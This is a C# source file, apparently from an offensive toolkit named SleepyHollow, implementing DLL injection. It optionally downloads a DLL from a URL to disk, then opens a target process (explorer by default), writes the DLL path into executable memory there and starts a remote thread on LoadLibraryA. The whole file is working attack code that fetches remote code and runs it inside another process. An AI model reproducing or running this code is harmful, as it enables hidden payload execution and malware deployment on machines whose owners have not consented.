using System.Diagnostics;
using System.Text;

namespace SleepyHollow;

internal static class InjectDLL
{
    internal static async Task Run(string dllName, string processName = "explorer")
    {
        if (Uri.TryCreate(dllName, UriKind.Absolute, out Uri uri))
        {
            if(RuntimeConfig.IsDebugEnabled) Console.WriteLine("Downloading...");
            var httpClient = new HttpClient();
            var data = await httpClient.GetByteArrayAsync(uri);
            var tempDirectory = FileSystem.FindWriteableDirectory();
            if (tempDirectory == null)
            {
                Console.WriteLine("Failed to find writeable directory");
                return;
            }
            dllName = Path.Combine(FileSystem.FindWriteableDirectory(), $"{Path.GetRandomFileName()}.dll");
            if(RuntimeConfig.IsDebugEnabled) Console.WriteLine($"Writing to {dllName}");
            await FileSystem.WriteFile(dllName, data);
        }

        var process = Process.GetProcessesByName(processName);
        if (process.Length == 0)
        {
            Console.WriteLine("Process not found");
        }

        var pid = process[0].Id;
        if (RuntimeConfig.IsDebugEnabled) Console.WriteLine($"Process ID: {pid}");

        IntPtr hProcess = Lib.OpenProcess(OpenProcessFlags.PROCESS_ALL_ACCESS, false, pid);
        if (RuntimeConfig.IsDebugEnabled) Console.WriteLine($"Process handle: 0x{hProcess:X}");

        IntPtr lpAddress = Lib.VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, Lib.MEM_COMMIT_AND_RESERVE, Lib.PAGE_EXECUTE_READWRITE);
        if (RuntimeConfig.IsDebugEnabled) Console.WriteLine($"Allocated address: 0x{lpAddress:X}");
        var res = Lib.WriteProcessMemory(hProcess, lpAddress, Encoding.Default.GetBytes(dllName), dllName.Length, out nint outSize);
        if (RuntimeConfig.IsDebugEnabled) Console.WriteLine($"WriteProcessMemory result: {res} - Bytes written: {outSize}");
        IntPtr loadLib = Lib.GetProcAddress(Lib.GetModuleHandle("kernel32.dll"), "LoadLibraryA");
        if (loadLib == IntPtr.Zero)
        {
            Console.WriteLine("Failed to get LoadLibraryA address");
        }

        if (RuntimeConfig.IsDebugEnabled) Console.WriteLine($"LoadLibraryA address: 0x{loadLib:X}");
        IntPtr hThread = Lib.CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, lpAddress, 0, IntPtr.Zero);
        if (RuntimeConfig.IsDebugEnabled) Console.WriteLine($"Thread creation successful - Thread handle: 0x{hThread:x8}");
        
    }
}